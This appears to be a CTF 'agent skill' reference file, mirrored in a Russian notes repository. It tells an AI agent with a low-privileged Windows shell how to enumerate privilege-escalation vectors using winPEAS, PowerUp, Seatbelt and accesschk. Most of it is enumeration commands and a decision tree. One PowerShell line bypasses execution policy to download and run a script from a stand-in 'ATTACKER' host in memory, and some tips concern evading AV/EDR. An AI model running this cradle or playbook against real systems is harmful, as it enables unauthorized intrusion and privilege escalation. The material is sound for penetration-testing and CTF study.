# Windows Privilege Escalation Enumeration (winPEAS / PowerUp / Seatbelt)

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-windows/windows-enum-winpeas.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-windows/windows-enum-winpeas.md)

---

---
name: windows-enum-winpeas
category: host-windows
triggers: ["winpeas", "PowerUp", "Seatbelt", "whoami /priv", "whoami /all", "systeminfo", "windows enumeration", "privesc enum", "low-priv shell"]
tools: ["winPEASx64.exe", "winPEAS.bat", "PowerUp.ps1", "Seatbelt.exe", "accesschk.exe", "cmd", "powershell", "wmic"]
priority: high
description: First-move Windows privilege-escalation enumeration - run automated scanners plus manual triage and decide which vector to pursue.
---
# Windows Privilege Escalation Enumeration (winPEAS / PowerUp / Seatbelt)

## Trigger context
You have landed a low-privileged interactive shell (RDP, WinRM/Evil-WinRM, reverse shell from a web app, or a service account such as `iis apppool\*`, `NETWORK SERVICE`, `LOCAL SERVICE`). You do not yet know the escalation path. This file is the entry point: enumerate first, then branch to the specialized files below.

## Objective
Produce a prioritized list of escalation candidates: token privileges, misconfigured services, stored credentials, UAC/registry abuses, and kernel/patch level - so the agent can pick the highest-probability vector quickly.

## Methodology (decision tree)
1. Identity and privileges first - `whoami /priv` and `whoami /all`. A single held privilege (SeImpersonate, SeBackup, SeRestore, SeDebug, SeTakeOwnership, SeLoadDriver) is often an instant win. STOP here if one is present and jump to `token-impersonation-potato`.
2. OS / patch level - `systeminfo` and the build number. Feeds kernel-exploit and Potato-variant selection.
3. Run one automated scanner to cast wide: winPEAS (broadest), or PowerUp (services/registry focus), or Seatbelt (host posture). Prefer winPEAS if you can drop a binary; PowerUp if you only have a PowerShell foothold.
4. Manually confirm anything the scanner flags "RED" - scanners produce false positives; never fire an exploit on scanner output alone.
5. Branch:
   - Held privilege -> `token-impersonation-potato`
   - Service/path/DLL issue -> `service-misconfigurations`
   - Passwords/hashes -> `credential-hunting`
   - AlwaysInstallElevated / autoruns / scheduled tasks / writable PATH -> `uac-and-registry`

## Commands & payloads
Identity, privileges, and system baseline:
```cmd
whoami /priv
whoami /all
whoami /groups
systeminfo
hostname & echo %USERDOMAIN%\%USERNAME%
net user %USERNAME%
net localgroup administrators
```
PowerShell baseline:
```powershell
[System.Environment]::OSVersion.Version
Get-LocalGroupMember Administrators
Get-CimInstance Win32_OperatingSystem | Select Caption,BuildNumber,OSArchitecture
```
Run winPEAS (drop and execute; `cmd` version if no binary allowed):
```cmd
winPEASx64.exe                          REM full scan
winPEASx64.exe quiet cmd fast           REM faster, cmd-only checks
winPEASany.exe systeminfo userinfo      REM scoped modules
winPEAS.bat                             REM pure-batch fallback
```
Run PowerUp (in-memory, avoids touching disk):
```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"
# or, once loaded:
. .\PowerUp.ps1 ; Invoke-AllChecks | Format-List
```
Run Seatbelt (host posture / creds / autoruns):
```cmd
Seatbelt.exe -group=all
Seatbelt.exe -group=system
Seatbelt.exe TokenPrivileges TokenGroups
```
accesschk (Sysinternals) for object permission triage - accept EULA silently:
```cmd
accesschk.exe /accepteula
accesschk.exe -uwcqv "Users" *              REM services writable by Users
accesschk.exe -uwdqs "Users" c:\            REM writable dirs
```

## Branching logic
- winPEAS/PowerUp flags an unquoted service path OR modifiable service/binary/registry -> `service-misconfigurations`.
- `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` Enabled -> `token-impersonation-potato` (Potato family).
- `SeBackupPrivilege` / `SeRestorePrivilege` / `SeTakeOwnershipPrivilege` / `SeDebugPrivilege` -> `token-impersonation-potato` (privilege-abuse section, not Potato).
- winPEAS "AlwaysInstallElevated set to 1" or autorun/scheduled-task findings -> `uac-and-registry`.
- Any password, hash, or credential file surfaced -> `credential-hunting`.

## Common pitfalls
- Running the wrong architecture binary (use `winPEASx64.exe` on 64-bit; check `echo %PROCESSOR_ARCHITECTURE%`).
- AV/EDR eating dropped binaries - prefer PowerUp/Seatbelt in-memory, or the `winPEAS.bat`.
- Trusting scanner RED items blindly; verify with `accesschk`/`sc qc` before exploiting.
- Forgetting `/accepteula` on Sysinternals tools causes a hang waiting for GUI consent.
- `whoami /priv` shows privileges as "Disabled" - many (SeImpersonate) still work; disabled != unusable for token abuse.
- Not checking whether you are in a restricted/AppContainer or Constrained Language Mode PowerShell (`$ExecutionContext.SessionState.LanguageMode`).

## Proof / verification
- Capture `whoami /all` and `systeminfo` output as the enumeration baseline.
- Re-run `accesschk`/`sc qc` on any candidate to confirm the misconfiguration is real before exploiting.

## Cross-references
- [sa--instructions--host-windows--service-misconfigurations.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--service-misconfigurations.md)
- [sa--instructions--host-windows--token-impersonation-potato.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--token-impersonation-potato.md)
- [sa--instructions--host-windows--credential-hunting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--credential-hunting.md)
- [sa--instructions--host-windows--uac-and-registry.md](https://raw.githubusercontent.com/BigBread57/zametki/main/04-windows/sa--instructions--host-windows--uac-and-registry.md)

## Credible sources
- HackTricks - Windows Local Privilege Escalation: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- winPEAS (PEASS-ng): https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- PowerSploit PowerUp: https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- GhostPack Seatbelt: https://github.com/GhostPack/Seatbelt
- PayloadsAllTheThings - Windows Privilege Escalation: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
